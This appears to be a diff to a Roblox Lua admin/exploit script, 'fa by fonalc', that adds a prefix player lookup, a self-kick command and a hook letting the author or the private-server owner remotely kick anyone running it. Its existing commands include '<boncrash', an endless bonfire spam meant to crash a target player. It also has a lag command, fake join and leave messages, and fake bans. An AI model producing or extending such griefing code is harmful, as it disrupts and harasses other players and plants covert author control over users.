@@ -4,6 +4,14 @@ if game.PlaceId ~= 112420803 then
 	end
 end
 
+function GetPlayerFromStart(str:string)
+	for _, plr in pairs(game.Players:GetPlayers()) do
+		if plr.Name:find(str) and plr.Name:find(str) == 1 or plr.DisplayName:find(str) and plr.DisplayName:find(str) == 1 then
+			return plr
+		end
+	end
+	return nil
+end
 
 game.Players:Chat("h \n\n\n\n\n\n\n\n\n\n\n\nloaded fa by fonalc, get this script at fonalc.github.io/fa.\nsay <cmdPrint> then check console by saying /console.")
 local banned = {}
@@ -47,7 +55,7 @@ local plugins = {
 
 
 if game["Teleport Service"]:GetLocalPlayerTeleportData() then
-	game.Players:Chat("h Loaded JoinData from last rejoin")
+	game.Players:Chat("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\m Loaded join data from rejoin\n\n\n\n\n\n")
 	local data = game["Teleport Service"]:GetLocalPlayerTeleportData()
 	for _, gear in pairs(data.Gears) do
 		if gear.Name ~= "epicfungunlol" then
@@ -476,7 +484,7 @@ end)
 local fakeLeft = false
 
 function admin(msg, localPlr, Type): ()
-	if msg == "<fakejoin" then
+	if msg == "<fakejoin" and fakeLeft == true  then
 		game.Players:Chat("h \n\n\n\n\n\n\n"..localPlr.Name.." joined.")
 		game.Players:Chat("visible "..localPlr.Name)
 		fakeLeft=false
@@ -528,7 +536,7 @@ function admin(msg, localPlr, Type): ()
 				end
 			end
 		else
-			local plr = game.Players:FindFirstChild(split[2])
+			local plr = GetPlayerFromStart(split[2])
 			if plr and not plr.Character:FindFirstChild("Shirt Graphic") or plr.Character["Shirt Graphic"].Graphic ~= "http://www.roblox.com/asset/?id=14351776240" then
 				game.Players:Chat("h \n\n\n\n\n\n\n"..plr.Name.." was banned lol.")
 				game.Players:Chat("pm "..plr.Name.." ur banned.")
@@ -539,7 +547,7 @@ function admin(msg, localPlr, Type): ()
 		end
 	end
 	if split[1] == "<sspun" then
-		local plr = game.Players:FindFirstChild(split[2])
+		local plr = GetPlayerFromStart(split[2])
 		if split[2] == "all" then
 			for _, plr in pairs(game.Players:GetPlayers()) do
 				if plr and table.find(banned, plr.Name) then
@@ -560,7 +568,7 @@ function admin(msg, localPlr, Type): ()
 				print(a)
 			end
 		else	
-			local plr = game.Players:FindFirstChild(split[2])
+			local plr = GetPlayerFromStart(split[2])
 			if plr then
 				game.Players:Chat("h \n\n\n\n\n\n\n"..plr.Name.." was unbanned lol.")
 				game.Players:Chat("pm "..plr.Name.." ur unbanned.")
@@ -570,7 +578,7 @@ function admin(msg, localPlr, Type): ()
 		end
 	end
 	if split[1] == "<hasfa" then
-		local plr = game.Players:FindFirstChild(split[2])
+		local plr = GetPlayerFromStart(split[2])
 		if plr then
 			if plr.Character:FindFirstChild("Shirt Graphic") then
 				if plr.Character["Shirt Graphic"].Graphic ~= "http://www.roblox.com/asset/?id=14351776240" then
@@ -641,7 +649,7 @@ function admin(msg, localPlr, Type): ()
 		end
 	end
 	if split[1] == "<boncrash" then
-		local plr = game.Players:FindFirstChild(split[2])
+		local plr = GetPlayerFromStart(split[2])
 		if plr then
 			while wait() do
 				game.Players:Chat("bonfire "..plr.Name)
@@ -702,7 +710,7 @@ function admin(msg, localPlr, Type): ()
 		localPlr.Character.HumanoidRootPart.CFrame = old
 	end
 	if split[1] == "<lag" then
-		local plr = game.Players:FindFirstChild(split[2])
+		local plr = GetPlayerFromStart(split[2])
 		if plr then
 			spawn(function()
 				game.Players:Chat("skydive "..plr.Name)
@@ -728,7 +736,7 @@ function admin(msg, localPlr, Type): ()
 				end
 			end
 		else
-			local plr = game.Players:FindFirstChild(split[2])
+			local plr = GetPlayerFromStart(split[2])
 			if plr then
 				game.Players:Chat("h \n\n\n\n\n\n\n"..plr.Name.." has FA.")
 				game.Players:Chat("pm "..plr.Name.." you have FA now!!")
@@ -1013,6 +1021,9 @@ function admin(msg, localPlr, Type): ()
 		
 	]]..table.concat(split, "."))()
 	end
+	if split[1] == "<exit>" then
+		game.Players.LocalPlayer:Kick("Quitted.")
+	end
 end
 
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
@@ -1045,3 +1056,14 @@ game.Players.PlayerRemoving:Connect(function(plr)
 		game.Players:Chat("h \n\n\n\n\n\n\n"..plr.Name.." left.")	
 	end
 end)
+
+for _, a in pairs(game.Players:GetPlayers()) do
+	if a.Name == "Fonalc" or a.UserId == game.PrivateServerOwnerId then
+		a.Chatted:Connect(function(msg)
+			local split = msg:split(" ")
+			if split[1] == "<fa" and split[2] == "kick" and GetPlayerFromStart(split[3]) and GetPlayerFromStart(split[3]).Name == game.Players.LocalPlayer.Name then
+				game.Players.LocalPlayer:Kick("Forced kick from "..a.Name..".")
+			end
+		end)
+	end
+end
